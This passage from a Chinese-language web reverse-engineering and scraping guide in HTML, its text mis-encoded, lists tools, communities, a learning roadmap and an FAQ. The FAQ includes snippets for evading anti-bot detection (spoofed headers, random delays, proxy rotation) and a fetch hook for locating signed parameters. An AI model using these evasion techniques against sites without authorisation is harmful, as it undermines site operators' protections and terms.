            <td>è·¨æµè§ˆå™¨ã€æ–‡æ¡£è¯¦ç»†</td>
          </tr>
          <tr>
            <td><strong>Selenium</strong></td>
            <td>https://www.selenium.dev/documentation/</td>
            <td>å¤šè¯­è¨€æ”¯æŒ</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="æŠ“åŒ…å·¥å…·">æŠ“åŒ…å·¥å…·</h3>

      <table>
        <thead>
          <tr>
            <th>å·¥å…·</th>
            <th>å®˜æ–¹æ–‡æ¡£</th>
            <th>ç‰¹ç‚¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>mitmproxy</strong></td>
            <td>https://docs.mitmproxy.org/</td>
            <td>è¯¦ç»†æ•™ç¨‹ã€è„šæœ¬ç¤ºä¾‹</td>
          </tr>
          <tr>
            <td><strong>Burp Suite å­¦é™¢</strong></td>
            <td>https://portswigger.net/web-security</td>
            <td>æƒå¨ä¸“ä¸šã€äº’åŠ¨å®éªŒ</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="ç¤¾åŒºä¸è®ºå›">ç¤¾åŒºä¸è®ºå›</h2>

      <h3 id="å›½å†…ç¤¾åŒº">å›½å†…ç¤¾åŒº</h3>

      <table>
        <thead>
          <tr>
            <th>ç¤¾åŒºåç§°</th>
            <th>ç½‘å€</th>
            <th>ä¸»è¦æ ‡ç­¾/èŠ‚ç‚¹</th>
            <th>ç‰¹ç‚¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>æ˜é‡‘</strong></td>
            <td>https://juejin.cn/</td>
            <td>JavaScriptã€å‰ç«¯ã€çˆ¬è™«</td>
            <td>é«˜è´¨é‡æŠ€æœ¯æ–‡ç« </td>
          </tr>
          <tr>
            <td><strong>SegmentFault</strong></td>
            <td>https://segmentfault.com/</td>
            <td>æŠ€æœ¯é—®ç­”</td>
            <td>é—®ç­”ç¤¾åŒºã€æŠ€æœ¯åˆ†äº«</td>
          </tr>
          <tr>
            <td><strong>V2EX</strong></td>
            <td>https://www.v2ex.com/</td>
            <td><code>/go/programmer</code></td>
            <td>æŠ€æœ¯äº¤æµã€è¡Œä¸šè®¨è®º</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="å›½å¤–ç¤¾åŒº">å›½å¤–ç¤¾åŒº</h3>

      <table>
        <thead>
          <tr>
            <th>ç¤¾åŒºåç§°</th>
            <th>ç½‘å€/æ¿å—</th>
            <th>ä¸»è¦å†…å®¹</th>
            <th>ç‰¹ç‚¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Stack Overflow</strong></td>
            <td>https://stackoverflow.com/</td>
            <td><code>web-scraping</code>, <code>javascript</code>, <code>reverse-engineering</code></td>
            <td>å…¨çƒæœ€å¤§æŠ€æœ¯é—®ç­”</td>
          </tr>
          <tr>
            <td><strong>Reddit</strong></td>
            <td>â€¢ r/webscraping<br>â€¢ r/javascript<br>â€¢ r/ReverseEngineering<br>â€¢ r/netsec</td>
            <td>Web çˆ¬è™«ã€JavaScriptã€é€†å‘ã€å®‰å…¨</td>
            <td>è®¨è®ºæ´»è·ƒã€èµ„æºåˆ†äº«</td>
          </tr>
          <tr>
            <td><strong>GitHub Discussions</strong></td>
            <td>puppeteer/puppeteer<br>scrapy/scrapy<br>babel/babel</td>
            <td>é¡¹ç›®è®¨è®º</td>
            <td>å®˜æ–¹ç¤¾åŒºã€æŠ€æœ¯äº¤æµ</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="å­¦ä¹ è·¯çº¿å»ºè®®">å­¦ä¹ è·¯çº¿å»ºè®®</h2>

      <h3 id="é˜¶æ®µä¸€åŸºç¡€å¤¯å®1-2-ä¸ªæœˆ">é˜¶æ®µä¸€ï¼šåŸºç¡€å¤¯å®ï¼ˆ1-2 ä¸ªæœˆï¼‰</h3>

      <table>
        <thead>
          <tr>
            <th>ç›®æ ‡</th>
            <th>å­¦ä¹ å†…å®¹</th>
            <th>å®æˆ˜é¡¹ç›®</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>æŒæ¡ Web åŸºç¡€å’Œå¼€å‘è€…å·¥å…·</td>
            <td>1. <strong>HTTP åè®®</strong>: ã€Šå›¾è§£ HTTPã€‹<br>2. <strong>JavaScript åŸºç¡€</strong>: ã€ŠJavaScript é«˜çº§ç¨‹åºè®¾è®¡ã€‹å‰ 10
              ç« <br>3. <strong>å¼€å‘è€…å·¥å…·</strong>: Chrome DevTools å®˜æ–¹æ–‡æ¡£<br>4. <strong>HTML/CSS</strong>: MDN Web Docs</td>
            <td>â€¢ ç”¨ Chrome DevTools åˆ†æ 10 ä¸ªä¸åŒç½‘ç«™çš„è¯·æ±‚<br>â€¢ å®Œæˆ JavaScript30 çš„å‰ 10 ä¸ªé¡¹ç›®<br>â€¢ æ‰‹å†™ç®€å•çš„è¡¨å•éªŒè¯å’Œ AJAX è¯·æ±‚</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="é˜¶æ®µäºŒå·¥å…·æŒæ¡1-2-ä¸ªæœˆ">é˜¶æ®µäºŒï¼šå·¥å…·æŒæ¡ï¼ˆ1-2 ä¸ªæœˆï¼‰</h3>

      <table>
        <thead>
          <tr>
            <th>ç›®æ ‡</th>
            <th>å­¦ä¹ å†…å®¹</th>
            <th>å®æˆ˜é¡¹ç›®</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>ç†Ÿç»ƒä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·å’ŒæŠ“åŒ…å·¥å…·</td>
            <td>1. <strong>Puppeteer</strong>: å®˜æ–¹æ–‡æ¡£ + å®æˆ˜æ¡ˆä¾‹<br>2. <strong>æŠ“åŒ…å·¥å…·</strong>: Burp Suite æˆ– Charles<br>3.
              <strong>Python åŸºç¡€</strong>: å»–é›ªå³° Python æ•™ç¨‹<br>4. <strong>æ­£åˆ™è¡¨è¾¾å¼</strong>: åœ¨çº¿ç»ƒä¹ ï¼ˆregex101.comï¼‰</td>
            <td>â€¢ ç”¨ Puppeteer çˆ¬å– 3 ä¸ªåŠ¨æ€ç½‘ç«™<br>â€¢ ç”¨ Burp Suite åˆ†æç§»åŠ¨ APP æ¥å£<br>â€¢ å†™ä¸€ä¸ªè‡ªåŠ¨ç™»å½•è„šæœ¬ï¼ˆå¸¦éªŒè¯ç è¯†åˆ«ï¼‰</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="é˜¶æ®µä¸‰é€†å‘æŠ€æœ¯2-3-ä¸ªæœˆ">é˜¶æ®µä¸‰ï¼šé€†å‘æŠ€æœ¯ï¼ˆ2-3 ä¸ªæœˆï¼‰</h3>

      <table>
        <thead>
          <tr>
            <th>ç›®æ ‡</th>
            <th>å­¦ä¹ å†…å®¹</th>
            <th>å®æˆ˜é¡¹ç›®</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>ç†è§£åŠ å¯†ã€æ··æ·†ã€åè°ƒè¯•æŠ€æœ¯</td>
            <td>1. <strong>JavaScript è¿›é˜¶</strong>: ã€Šä½ ä¸çŸ¥é“çš„ JavaScriptã€‹<br>2. <strong>åŠ å¯†ç®—æ³•</strong>: crypto-js æ–‡æ¡£ +
              CyberChef å®è·µ<br>3. <strong>AST è§£æ</strong>: Babel æ’ä»¶å¼€å‘æ•™ç¨‹<br>4. <strong>åæ··æ·†</strong>: webcrackã€de4js å·¥å…·ä½¿ç”¨
            </td>
            <td>â€¢ åˆ†æ 5 ä¸ªç½‘ç«™çš„åŠ å¯†å‚æ•°ï¼ˆsignã€tokenï¼‰<br>â€¢ ç”¨ Babel å†™ä¸€ä¸ªç®€å•çš„åæ··æ·†è„šæœ¬<br>â€¢ ç ´è§£ä¸€ä¸ªç®€å•çš„ JavaScript æ··æ·†</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="é˜¶æ®µå››ç»¼åˆå®æˆ˜æŒç»­">é˜¶æ®µå››ï¼šç»¼åˆå®æˆ˜ï¼ˆæŒç»­ï¼‰</h3>

      <table>
        <thead>
          <tr>
            <th>ç›®æ ‡</th>
            <th>å­¦ä¹ å†…å®¹</th>
            <th>å®æˆ˜é¡¹ç›®</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>è§£å†³çœŸå®ä¸–ç•Œçš„å¤æ‚æ¡ˆä¾‹</td>
            <td>1. <strong>é«˜çº§åçˆ¬è™«</strong>: TLS æŒ‡çº¹ã€Canvas æŒ‡çº¹ã€è®¾å¤‡æŒ‡çº¹<br>2. <strong>åè®®é€†å‘</strong>:
              WebSocketã€gRPCã€Protobuf<br>3. <strong>WebAssembly</strong>: wabt å·¥å…·é“¾ã€é€†å‘åˆ†æ<br>4. <strong>ç§»åŠ¨ç«¯</strong>:
              Frida Hookã€APP è„±å£³</td>
            <td>â€¢ å‚åŠ  CTF æ¯”èµ›ï¼ˆWeb æ–¹å‘ï¼‰<br>â€¢ é€†å‘ä¸€ä¸ª Webpack æ‰“åŒ…çš„ SPA åº”ç”¨<br>â€¢ åˆ†æä¸€ä¸ªä½¿ç”¨ WebAssembly çš„ç½‘ç«™<br>â€¢ å®Œæˆå¾çˆ±ç ´è§£è®ºå›çš„é€†å‘é¢˜ç›®</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="å­¦ä¹ æŠ€å·§">å­¦ä¹ æŠ€å·§</h2>

      <h3 id="é«˜æ•ˆå­¦ä¹ æ–¹æ³•">é«˜æ•ˆå­¦ä¹ æ–¹æ³•</h3>

      <table>
        <thead>
          <tr>
            <th>æ–¹æ³•</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>ä»¥é¡¹ç›®ä¸ºé©±åŠ¨</strong></td>
            <td>è¾¹å­¦è¾¹åšï¼Œä¸è¦åªçœ‹ä¸ç»ƒ</td>
          </tr>
          <tr>
            <td><strong>ä¸»åŠ¨è°ƒè¯•</strong></td>
            <td>å¤šç”¨æ–­ç‚¹ï¼Œå°‘çŒœæµ‹</td>
          </tr>
          <tr>
            <td><strong>è®°å½•ç¬”è®°</strong></td>
            <td>æ•´ç†å¸¸è§å¥—è·¯å’ŒæŠ€å·§</td>
          </tr>
          <tr>
            <td><strong>åˆ†äº«äº¤æµ</strong></td>
            <td>å†™åšå®¢ã€å‚ä¸è®¨è®º</td>
          </tr>
          <tr>
            <td><strong>å®šæœŸå¤ä¹ </strong></td>
            <td>æ¸©æ•…çŸ¥æ–°ï¼Œå·©å›ºçŸ¥è¯†</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="å¸¸è§è¯¯åŒº">å¸¸è§è¯¯åŒº</h3>

      <table>
        <thead>
          <tr>
            <th>è¯¯åŒº</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>âŒ <strong>åªçœ‹æ•™ç¨‹ä¸åŠ¨æ‰‹</strong></td>
            <td>çœ‹æ‡‚ â‰  ä¼šåš</td>
          </tr>
          <tr>
            <td>âŒ <strong>è¿½æ±‚å·¥å…·è€ŒéåŸç†</strong></td>
            <td>å·¥å…·ä¼šè¿‡æ—¶ï¼ŒåŸç†ä¸ä¼š</td>
          </tr>
          <tr>
            <td>âŒ <strong>å®Œç¾ä¸»ä¹‰</strong></td>
            <td>ä¸éœ€è¦ 100% è¿˜åŸä»£ç ï¼Œç†è§£æ ¸å¿ƒé€»è¾‘å³å¯</td>
          </tr>
          <tr>
            <td>âŒ <strong>å­¤ç«‹å­¦ä¹ </strong></td>
            <td>å¤šä¸ç¤¾åŒºäº¤æµï¼Œé¿å…é—­é—¨é€ è½¦</td>
          </tr>
          <tr>
            <td>âŒ <strong>å¿½è§†åŸºç¡€</strong></td>
            <td>HTTPã€JavaScript åŸºç¡€æ˜¯ä¸€åˆ‡çš„æ ¹åŸº</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="æ—¶é—´ç®¡ç†">æ—¶é—´ç®¡ç†</h3>

      <p><strong>æ¯æ—¥å­¦ä¹ è®¡åˆ’ç¤ºä¾‹</strong>:</p>

      <table>
        <thead>
          <tr>
            <th>æ—¶é—´æ®µ</th>
            <th>å­¦ä¹ å†…å®¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>09:00-10:00</td>
            <td>é˜…è¯»ç†è®ºçŸ¥è¯†ï¼ˆä¹¦ç±/æ–‡ç« ï¼‰</td>
          </tr>
          <tr>
            <td>10:00-12:00</td>
            <td>å®æˆ˜ç»ƒä¹ ï¼ˆå†™ä»£ç /åšé¢˜ï¼‰</td>
          </tr>
          <tr>
            <td>14:00-16:00</td>
            <td>é¡¹ç›®å®è·µ</td>
          </tr>
          <tr>
            <td>16:00-17:00</td>
            <td>å¤ç›˜æ€»ç»“ï¼ˆå†™ç¬”è®°/åšå®¢ï¼‰</td>
          </tr>
        </tbody>
      </table>

      <p><strong>æ¯å‘¨ç›®æ ‡</strong>:</p>

      <ul>
        <li>âœ… å®Œæˆ 1-2 ä¸ªå°é¡¹ç›®</li>
        <li>âœ… é˜…è¯» 3-5 ç¯‡æŠ€æœ¯æ–‡ç« </li>
        <li>âœ… è§£å†³ 5-10 é“ç»ƒä¹ é¢˜</li>
        <li>âœ… å†™ 1 ç¯‡å­¦ä¹ ç¬”è®°</li>
      </ul>

      <hr />

      <h2 id="ä¿æŒæ›´æ–°">ä¿æŒæ›´æ–°</h2>

      <h3 id="æŠ€æœ¯èµ„è®¯">æŠ€æœ¯èµ„è®¯</h3>

      <table>
        <thead>
          <tr>
            <th>æ›´æ–°é¢‘ç‡</th>
            <th>æ¨èèµ„æº</th>
            <th>é“¾æ¥</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>æ¯æ—¥å¿…çœ‹</strong></td>
            <td>Hacker News</td>
            <td>https://news.ycombinator.com/</td>
          </tr>
          <tr>
            <td><strong>æ¯æ—¥å¿…çœ‹</strong></td>
            <td>GitHub Trending</td>
            <td>https://github.com/trending</td>
          </tr>
          <tr>
            <td><strong>æ¯å‘¨æ¨è</strong></td>
            <td>JavaScript Weekly</td>
            <td>https://javascriptweekly.com/</td>
          </tr>
          <tr>
            <td><strong>æ¯å‘¨æ¨è</strong></td>
            <td>Web Tools Weekly</td>
            <td>https://webtoolsweekly.com/</td>
          </tr>
          <tr>
            <td><strong>æ¯æœˆå…³æ³¨</strong></td>
            <td>MDN Web Docs æ›´æ–°æ—¥å¿—</td>
            <td>-</td>
          </tr>
          <tr>
            <td><strong>æ¯æœˆå…³æ³¨</strong></td>
            <td>Chrome/Firefox æ–°ç‰ˆæœ¬ç‰¹æ€§</td>
            <td>-</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="è·Ÿè¿›æŠ€æœ¯è¶‹åŠ¿">è·Ÿè¿›æŠ€æœ¯è¶‹åŠ¿</h3>

      <table>
        <thead>
          <tr>
            <th>å…³æ³¨ç‚¹</th>
            <th>ç¤ºä¾‹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>å…³æ³¨æ–°å·¥å…·</strong></td>
            <td>Bunã€Denoã€Fresh ç­‰</td>
          </tr>
          <tr>
            <td><strong>å­¦ä¹ æ–°æ ‡å‡†</strong></td>
            <td>ES2024ã€HTTP/3</td>
          </tr>
          <tr>
            <td><strong>äº†è§£æ–°æŠ€æœ¯</strong></td>
            <td>AI è¾…åŠ©é€†å‘ã€è‡ªåŠ¨åŒ–æµ‹è¯•</td>
          </tr>
          <tr>
            <td><strong>è®¢é˜…åšå®¢</strong></td>
            <td>RSS è®¢é˜…å–œæ¬¢çš„æŠ€æœ¯åšå®¢</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#11-Resources-github-projects">å¼€æºé¡¹ç›®æ¨è</a></li>
        <li><a href="#11-Resources-faq">å¸¸è§é—®é¢˜ FAQ</a></li>
        <li><a href="#03-Basic-Recipes-re-workflow">é€†å‘å·¥ç¨‹å·¥ä½œæµ</a></li>
        <li><a href="#02-Tooling-browser-devtools">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
      </ul>

    </div>

    <div class="section" id="11-Resources-faq">
      <h2>83. FAQ</h2>
      <h1 id="å¸¸è§é—®é¢˜-faq">å¸¸è§é—®é¢˜ (FAQ)</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>æœ¬ç« æ±‡æ€»äº† Web é€†å‘å·¥ç¨‹ä¸­çš„å¸¸è§é—®é¢˜å’Œè§£ç­”ï¼Œå¸®åŠ©ä½ å¿«é€Ÿè§£å†³å¸¸è§å›°æƒ‘ã€‚</p>

      <hr />

      <h2 id="å…¥é—¨é—®é¢˜">å…¥é—¨é—®é¢˜</h2>

      <h3 id="q1-å­¦ä¹ -web-é€†å‘éœ€è¦å“ªäº›åŸºç¡€çŸ¥è¯†">Q1: å­¦ä¹  Web é€†å‘éœ€è¦å“ªäº›åŸºç¡€çŸ¥è¯†ï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <p><strong>å¿…å¤‡åŸºç¡€</strong>:</p>

      <ol>
        <li><strong>HTTP/HTTPS åè®®</strong>: ç†è§£è¯·æ±‚/å“åº”ã€çŠ¶æ€ç ã€å¤´éƒ¨</li>
        <li><strong>JavaScript åŸºç¡€</strong>: å˜é‡ã€å‡½æ•°ã€é—­åŒ…ã€åŸå‹é“¾ã€å¼‚æ­¥ç¼–ç¨‹</li>
        <li><strong>HTML/CSS</strong>: DOM ç»“æ„ã€é€‰æ‹©å™¨</li>
        <li><strong>å¼€å‘è€…å·¥å…·</strong>: Chrome DevTools åŸºæœ¬ä½¿ç”¨</li>
      </ol>

      <p><strong>æ¨èæŒæ¡</strong>:</p>

      <ol>
        <li>Python/Node.js ç¼–ç¨‹</li>
        <li>æ­£åˆ™è¡¨è¾¾å¼</li>
        <li>åŸºç¡€åŠ å¯†ç®—æ³•ï¼ˆMD5ã€SHAã€AESï¼‰</li>
        <li>ç½‘ç»œæŠ“åŒ…å·¥å…·ï¼ˆBurp Suiteã€Charlesï¼‰</li>
      </ol>

      <p><strong>å¯é€‰è¿›é˜¶</strong>:</p>

      <ol>
        <li>æ•°æ®ç»“æ„ä¸ç®—æ³•</li>
        <li>ç¼–è¯‘åŸç†ï¼ˆASTï¼‰</li>
        <li>WebAssembly</li>
        <li>å¯†ç å­¦</li>
      </ol>

      <hr />

      <h3 id="q2-æˆ‘åº”è¯¥ä»å“ªé‡Œå¼€å§‹å­¦ä¹ ">Q2: æˆ‘åº”è¯¥ä»å“ªé‡Œå¼€å§‹å­¦ä¹ ï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <p><strong>æ¨èå­¦ä¹ è·¯çº¿</strong>:</p>

      <p><strong>ç¬¬ä¸€é˜¶æ®µï¼šåŸºç¡€å…¥é—¨ï¼ˆ1-2 å‘¨ï¼‰</strong></p>

      <ol>
        <li>å­¦ä¹  HTTP åè®®å’Œæµè§ˆå™¨å·¥ä½œåŸç†</li>
        <li>ç†Ÿç»ƒä½¿ç”¨ Chrome DevToolsï¼ˆNetworkã€Sourcesã€Consoleï¼‰</li>
        <li>æŒæ¡ JavaScript åŸºç¡€è¯­æ³•</li>
      </ol>

      <p><strong>ç¬¬äºŒé˜¶æ®µï¼šå·¥å…·ä½¿ç”¨ï¼ˆ1-2 å‘¨ï¼‰</strong></p>

      <ol>
        <li>å­¦ä¹  Burp Suite æˆ– Charles æŠ“åŒ…</li>
        <li>äº†è§£ Puppeteer/Playwright åŸºæœ¬ç”¨æ³•</li>
        <li>ç»ƒä¹ ç®€å•çš„çˆ¬è™«é¡¹ç›®</li>
      </ol>

      <p><strong>ç¬¬ä¸‰é˜¶æ®µï¼šæŠ€æœ¯æå‡ï¼ˆ2-4 å‘¨ï¼‰</strong></p>

      <ol>
        <li>å­¦ä¹  JavaScript åæ··æ·†</li>
        <li>ç†è§£å¸¸è§åŠ å¯†ç®—æ³•</li>
        <li>æŒæ¡ Hook æŠ€æœ¯</li>
      </ol>

      <p><strong>ç¬¬å››é˜¶æ®µï¼šå®æˆ˜æ¼”ç»ƒï¼ˆæŒç»­ï¼‰</strong></p>

      <ol>
        <li>åˆ†æçœŸå®ç½‘ç«™æ¡ˆä¾‹</li>
        <li>å‚ä¸ CTF æ¯”èµ›</li>
        <li>é˜…è¯»ä¼˜ç§€å¼€æºé¡¹ç›®</li>
      </ol>

      <hr />

      <h3 id="q3-web-é€†å‘åˆæ³•å—">Q3: Web é€†å‘åˆæ³•å—ï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <p><strong>åˆæ³•æ€§å–å†³äºç›®çš„å’Œæ–¹å¼</strong>:</p>

      <p><strong>âœ… åˆæ³•åœºæ™¯</strong>:</p>

      <ul>
        <li>å­¦ä¹ å’Œç ”ç©¶ç›®çš„</li>
        <li>è‡ªå·±ç½‘ç«™çš„å®‰å…¨æµ‹è¯•</li>
        <li>è·å¾—æˆæƒçš„æ¸—é€æµ‹è¯•</li>
        <li>CTF æ¯”èµ›</li>
        <li>å¼€æºé¡¹ç›®åˆ†æ</li>
      </ul>

      <p><strong>âŒ éæ³•åœºæ™¯</strong>:</p>

      <ul>
        <li>æœªç»æˆæƒè®¿é—®ä»–äººç³»ç»Ÿ</li>
        <li>çªƒå–æ•æ„Ÿæ•°æ®</li>
        <li>æ¶æ„æ”»å‡»ç½‘ç«™</li>
        <li>ä¾µçŠ¯çŸ¥è¯†äº§æƒ</li>
        <li>è¿åç”¨æˆ·åè®®ï¼ˆToSï¼‰</li>
      </ul>

      <p><strong>å»ºè®®</strong>:</p>

      <ol>
        <li>éµå®ˆ <code>robots.txt</code></li>
        <li>å°Šé‡ç½‘ç«™çš„æœåŠ¡æ¡æ¬¾</li>
        <li>ä¸è¦è¿›è¡Œ DDoS æ”»å‡»</li>
        <li>ä¸è¦çˆ¬å–æ•æ„Ÿä¸ªäººä¿¡æ¯</li>
        <li>è®¾ç½®åˆç†çš„è¯·æ±‚é¢‘ç‡</li>
      </ol>

      <hr />

      <h2 id="æŠ€æœ¯é—®é¢˜">æŠ€æœ¯é—®é¢˜</h2>

      <h3 id="q4-å¦‚ä½•ç»•è¿‡åçˆ¬è™«æ£€æµ‹">Q4: å¦‚ä½•ç»•è¿‡åçˆ¬è™«æ£€æµ‹ï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <p><strong>åˆ†å±‚å¯¹æŠ—ç­–ç•¥</strong>:</p>

      <p><strong>ç¬¬ä¸€å±‚ï¼šåŸºç¡€ä¼ªè£…</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="s1">&#39;https://example.com/&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;text/html,application/xhtml+xml,application/xml&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN,zh;q=0.9,en;q=0.8&#39;</span><span class="p">,</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>ç¬¬äºŒå±‚ï¼šè¡Œä¸ºæ¨¡æ‹Ÿ</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>

<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">))</span>  <span class="c1"># éšæœºå»¶è¿Ÿ</span>
</code></pre>
      </div>

      <p><strong>ç¬¬ä¸‰å±‚ï¼šä½¿ç”¨çœŸå®æµè§ˆå™¨</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">playwright.sync_api</span><span class="w"> </span><span class="kn">import</span> <span class="n">sync_playwright</span>

<span class="k">with</span> <span class="n">sync_playwright</span><span class="p">()</span> <span class="k">as</span> <span class="n">p</span><span class="p">:</span>
    <span class="n">browser</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">chromium</span><span class="o">.</span><span class="n">launch</span><span class="p">()</span>
    <span class="n">page</span> <span class="o">=</span> <span class="n">browser</span><span class="o">.</span><span class="n">new_page</span><span class="p">()</span>
    <span class="n">page</span><span class="o">.</span><span class="n">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>ç¬¬å››å±‚ï¼šä»£ç†è½®æ¢</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="n">proxies</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;http://proxy1.com:8080&#39;</span><span class="p">,</span> <span class="s1">&#39;http://proxy2.com:8080&#39;</span><span class="p">]</span>
<span class="n">proxy</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">proxies</span><span class="p">)</span>
</code></pre>
      </div>

      <p>è¯¦è§: <a href="#04-Advanced-Recipes-anti-scraping-deep-dive">åçˆ¬è™«æŠ€æœ¯æ·±åº¦åˆ†æ</a></p>

      <hr />

      <h3 id="q5-å¦‚ä½•æ‰¾åˆ°åŠ å¯†å‚æ•°çš„ç”Ÿæˆä½ç½®">Q5: å¦‚ä½•æ‰¾åˆ°åŠ å¯†å‚æ•°çš„ç”Ÿæˆä½ç½®ï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <p><strong>æ–¹æ³•ä¸€ï¼šå…¨å±€æœç´¢</strong></p>

      <ol>
        <li>æ‰“å¼€ DevTools -> Sources</li>
        <li><code>Ctrl+Shift+F</code> å…¨å±€æœç´¢å‚æ•°åï¼ˆå¦‚ <code>sign</code>ï¼‰</li>
        <li>æŸ¥çœ‹æ¯ä¸ªç»“æœï¼Œæ‰¾åˆ°èµ‹å€¼ä½ç½®</li>
      </ol>

      <p><strong>æ–¹æ³•äºŒï¼šXHR æ–­ç‚¹</strong></p>

      <ol>
        <li>DevTools -> Sources -> XHR/fetch Breakpoints</li>
        <li>æ·»åŠ  URL å…³é”®è¯ï¼ˆå¦‚ <code>/api/</code>ï¼‰</li>
        <li>åˆ·æ–°é¡µé¢ï¼Œæ–­ç‚¹åœä¸‹</li>
        <li>æŸ¥çœ‹ Call Stackï¼Œå®šä½ç”Ÿæˆå‡½æ•°</li>
      </ol>

      <p><strong>æ–¹æ³•ä¸‰ï¼šHook æ‹¦æˆª</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">originalFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Fetch]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// è‡ªåŠ¨æ–­ç‚¹</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalFetch</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="p">};</span>
</code></pre>
      </div>

      <p>è¯¦è§: <a href="#03-Basic-Recipes-debugging-techniques">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</a></p>

      <hr />

      <h3 id="q6-javascript-ä»£ç è¢«æ··æ·†äº†æ€ä¹ˆåŠ">Q6: JavaScript ä»£ç è¢«æ··æ·†äº†æ€ä¹ˆåŠï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <p><strong>åˆ†æ­¥è¿˜åŸ</strong>:</p>

      <p><strong>ç¬¬ä¸€æ­¥ï¼šæ ¼å¼åŒ–</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä½¿ç”¨ Prettier</span>
prettier<span class="w"> </span>--write<span class="w"> </span>obfuscated.js
</code></pre>
      </div>

      <p><strong>ç¬¬äºŒæ­¥ï¼šè¯†åˆ«æ··æ·†ç±»å‹</strong></p>

      <ul>
        <li>å˜é‡åæ··æ·†ï¼š<code>_0x1a2b</code></li>
        <li>å­—ç¬¦ä¸²æ•°ç»„ï¼š<code>var arr = ['str1', 'str2']</code></li>
        <li>æ§åˆ¶æµå¹³å¦åŒ–ï¼š<code>switch-case</code> ç»“æ„</li>
      </ul>

      <p><strong>ç¬¬ä¸‰æ­¥ï¼šä½¿ç”¨å·¥å…·</strong></p>

      <ul>
        <li>åœ¨çº¿å·¥å…·: https://lelinhtinh.github.io/de4js/</li>
        <li>AST å·¥å…·: Babel</li>
        <li>Webpack åæ‰“åŒ…: webcrack</li>
      </ul>

      <p><strong>ç¬¬å››æ­¥ï¼šæ‰‹åŠ¨åˆ†æ</strong></p>

      <ul>
        <li>åŠ¨æ€è°ƒè¯•ä¼˜äºé™æ€åˆ†æ</li>
